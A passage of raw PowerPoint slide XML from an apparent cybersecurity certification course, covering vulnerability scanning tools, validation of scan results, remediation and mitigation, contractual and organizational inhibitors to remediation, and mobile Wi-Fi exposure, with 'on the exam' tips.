                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Understand the organization and regulations driving the scans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442</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING SPECIAL CONSIDERATIONS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Special Scanning Considerations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Tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Updates and plug-ins help automate scans</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Nessus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Nessus Attack Scripting Language (NASL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Automate aspects of scanning process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Consistency in scans</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Recreate scans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443</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING SPECIAL CONSIDERATIONS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Special Scanning Considerations (3)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Security Control Automation Protocol (SCAP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Created by NIST</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Defines modules that dictate compliance requirements/settings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444</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING SPECIAL CONSIDERATIONS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Special Scanning Considerations (4)</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Intrusion detection system (IDS)/intrusion prevention system (IPS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Firewall may reject scans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445</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING SPECIAL CONSIDERATIONS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Special Scanning Considerations (5)</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Generating reports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Templates/format</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Automated vs. manual distribution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Possible executive presentation to client</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446</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VALIDATION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Validation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Validation is the process of confirming whether a scanner's reported finding is actually true, so that analysts act on real vulnerabilities rather than noise. Every result falls into one of four categories built from two response types, positive or negative and true or false.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A true positive is a real vulnerability the scanner correctly flagged, and a true negative is a clean condition the scanner correctly reported as safe. A false positive is an alert for a vulnerability that does not actually exist, wasting analyst time, while a false negative is a real vulnerability the scanner missed, which is the most dangerous outcome because the exposure goes unaddressed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because tuning tools to reduce false positives preserves time and credibility, but detecting and closing false negatives is what actually prevents breaches, so validation directly drives which findings get remediated.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam commonly gives a scenario and asks you to classify the outcome as true/false positive or negative, with false negatives framed as the highest risk.</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447</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VALIDATION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Validation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Determining whether data is true or not</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Four response types:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  True, false, negative, positive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Four categories:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  True positive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  False positive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  True negative</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  False negative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448</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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REMEDIATION AND MITIGATION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Remediation/ Mitigation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Remediation and mitigation are the corrective actions taken after vulnerabilities are identified, ranging from full fixes to risk-reducing controls. A configuration baseline is the documented collection of all approved property settings for a device, OS, or application, and comparing current settings against that baseline reveals unauthorized drift or misconfiguration, which is why baseline comparison is a core part of the audit process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts obtain trusted baselines from standards bodies such as CIS Benchmarks, DISA STIGs, or NIST, then identify vulnerabilities caused by weak configuration or outdated software and recommend patching, prioritizing security patches. Because organizations cannot fix everything at once, prioritization uses factors like CVSS severity, exploitability, asset criticality, and exposure to rank which items are addressed first.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because effective, prioritized remediation shrinks the attack surface efficiently, and baseline-driven auditing catches insecure states before an attacker can exploit them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect items on configuration baselines, sourcing benchmarks like CIS or STIGs, and prioritizing patches by severity, exploitability, and asset criticality.</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449</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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REMEDIATION AND MITIGATION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Remediation/ Mitigation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Configuration baseline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Collection of all property settings of a device, OS, application, etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Compare to current settings and determine changes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Often implemented in audit process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Find baselines from standards organizations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450</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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REMEDIATION AND MITIGATION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Remediation/ Mitigation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Identify vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Due to configuration or old software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Recommend patching software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Especially security patches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451</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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REMEDIATION AND MITIGATION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Remediation/ Mitigation (3)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Prioritizing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Most crucial vulnerabilities first</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Highest probability of occurring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Highest impact</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452</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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REMEDIATION AND MITIGATION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Remediation/ Mitigation (4)</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Hardening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Process of remediating</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Make a device less susceptible to attack</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453</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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REMEDIATION AND MITIGATION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Remediation/ Mitigation (5)</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Compensating controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Helps mitigate vulnerability without directly addressing the cause</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Example: firewall with closed ports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ideally implement layers of compensating controls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454</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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REMEDIATION AND MITIGATION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Remediation/ Mitigation (6)</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Risk acceptance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Document</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Have long-term solution to mitigate eventually</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455</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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REMEDIATION AND MITIGATION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Remediation/ Mitigation (7)</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Verification of mitigation</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456</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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INHIBITORS TO REMEDIATION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Inhibitors to Remediation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Inhibitors to remediation are the constraints that prevent an analyst from fixing a vulnerability even after it is discovered, and they are frequently contractual, organizational, or operational rather than technical. A memorandum of understanding (MOU) is a formal agreement that can authorize or limit scanning activities between parties, while a service-level agreement (SLA) dictates each party's responsibilities and may restrict both what can be scanned and which remediation actions are permitted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Organizational governance and business needs add further limits, because a patch or configuration change can cause collateral impact such as business process interruption or degraded functionality of a critical application. These realities force analysts to weigh the risk of leaving a vulnerability open against the risk of breaking a production service.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because recognizing these inhibitors is essential to setting realistic remediation plans, negotiating maintenance windows, and applying compensating controls when a direct fix is contractually or operationally blocked.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions test recognizing MOUs, SLAs, governance, legacy dependencies, and business-interruption risk as reasons a vulnerability cannot be immediately remediated.</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457</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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INHIBITORS TO REMEDIATION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Inhibitors to Remediation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Memorandum of understanding (MOU)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Authorizes/limits scanning activities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458</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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INHIBITORS TO REMEDIATION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Inhibitors to Remediation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Service-level agreement (SLA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Dictates what each party does</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  May limit remediation actions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  May limit scanning capabilities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459</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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INHIBITORS TO REMEDIATION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Inhibitors to Remediation (3)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Organizational governance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Potential limits on remediation due to collateral impact</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460</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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INHIBITORS TO REMEDIATION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Inhibitors to Remediation (4)</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Business process interruption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Degrading functionality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Legacy systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Proprietary systems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461</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Mobile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Mobile assets introduce vulnerabilities because devices roam beyond the corporate perimeter and connect back through untrusted paths. Wireless access points, any place where a device joins via Wi-Fi and enters the network infrastructure, are a common source of exposure through rogue APs, weak encryption, and evil-twin attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A virtual private network (VPN) mitigates this by establishing an encrypted tunnel that lets a device communicate securely even over an insecure access point such as public Wi-Fi. Mobile devices must still reach IT infrastructure over Wi-Fi or cellular, and older cellular technologies like 2G/GSM were notably insecure and susceptible to interception and downgrade attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
